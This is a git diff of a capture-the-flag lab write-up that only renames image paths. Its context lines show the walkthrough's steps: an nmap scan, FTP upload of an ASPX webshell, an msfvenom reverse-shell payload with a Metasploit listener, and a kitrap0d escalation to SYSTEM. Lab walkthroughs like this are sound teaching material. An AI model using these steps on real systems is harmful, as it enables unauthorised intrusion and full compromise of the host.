@@ -22,7 +22,7 @@ A service scan reveals only two accessible services.
 nmap -sC -sV -oN nmap_scan 10.129.242.143
 ```
 
-![Nmap Scan](images/nmap_scan.png)
+![Nmap Scan](Images/nmap_scan.png)
 	
 ### Result
 
@@ -71,7 +71,7 @@ List the contents.
 ftp> ls
 ```
 
-![FTP Files](images/ftp_listing.png)
+![FTP Files](Images/ftp_listing.png)
 
 Output:
 
@@ -93,7 +93,7 @@ Browse to the web server.
 http://10.129.242.143
 ```
 
-![IIS Homepage](images/IIS7.png)
+![IIS Homepage](Images/IIS7.png)
 
 The default IIS7 landing page is displayed.
 
@@ -115,7 +115,7 @@ Location:
 cd /usr/share/webshells/aspx
 ```
 
-![Copy Webshell](images/webshells.png)
+![Copy Webshell](Images/webshells.png)
 
 Files available include:
 
@@ -145,7 +145,7 @@ Upload the shell.
 put cmdasp.aspx
 ```
 
-![FTP Upload](images/ftp_webshell-upload.png)
+![FTP Upload](Images/ftp_webshell-upload.png)
 
 Verify the upload.
 
@@ -158,7 +158,7 @@ iisstart.htm
 welcome.png
 ```
 
-![FTP Listing](images/ftp_listing_after_upload.png)
+![FTP Listing](Images/ftp_listing_after_upload.png)
 
 The upload completes successfully.
 
@@ -171,7 +171,7 @@ Open the uploaded shell.
 ```
 http://10.129.242.143/cmdasp.aspx
 ```
-![Webshell](images/access-denied_webshell.png)
+![Webshell](Images/access-denied_webshell.png)
 
 The page provides a simple interface capable of executing arbitrary Windows commands.
 
@@ -181,7 +181,7 @@ Example:
 dir
 ```
 
-![Command Output](images/dir_cmd.png)
+![Command Output](Images/dir_cmd.png)
 
 The response displays the contents of:
 
@@ -233,7 +233,7 @@ LPORT=8888 \
 > devel.aspx
 ```
 
-![MSFVenom](images/msf-payload_exec.png)
+![MSFVenom](Images/msf-payload_exec.png)
 
 Configure a Metasploit listener.
 
@@ -246,7 +246,7 @@ set LPORT 8888
 
 run
 ```
-![Handler](images/msf-options.png)
+![Handler](Images/msf-options.png)
 
 Upload the generated payload through FTP.
 
@@ -254,7 +254,7 @@ Upload the generated payload through FTP.
 put devel.aspx
 ```
 
-![FTP Upload Payload](images/ftp-put-revshell.png)
+![FTP Upload Payload](Images/ftp-put-revshell.png)
 
 The upload succeeds successfully.
 
@@ -332,7 +332,7 @@ set SESSION 2
 run
 ```
 
-![Local Exploit Suggester](images/13_local_exploit_suggester.png)
+![Local Exploit Suggester](Images/13_local_exploit_suggester.png)
 
 The module reports several potential exploits, including:
 
@@ -377,7 +377,7 @@ Run the exploit.
 run
 ```
 
-![Exploit Configuration](images/14_kitrap0d_options.png)
+![Exploit Configuration](Images/14_kitrap0d_options.png)
 
 After successful execution, Metasploit establishes a new privileged Meterpreter session.
 
@@ -397,7 +397,7 @@ Output:
 NT AUTHORITY\SYSTEM
 ```
 
-![SYSTEM Meterpreter](images/15_system_meterpreter.png)
+![SYSTEM Meterpreter](Images/15_system_meterpreter.png)
 
 The privilege escalation is now complete.
 
@@ -407,7 +407,7 @@ The privilege escalation is now complete.
 
 Navigate to the standard user profile.
 
-![User Directory](images/16_user_directory.png)
+![User Directory](Images/16_user_directory.png)
 
 ```cmd
 cd C:\Users\babis\Desktop
@@ -435,7 +435,7 @@ The user flag is successfully captured.
 
 Navigate to the Administrator desktop.
 
-![Root Flag](images/17_root_flag.png)
+![Root Flag](Images/17_root_flag.png)
 
 ```cmd
 cd C:\Users\Administrator\Desktop
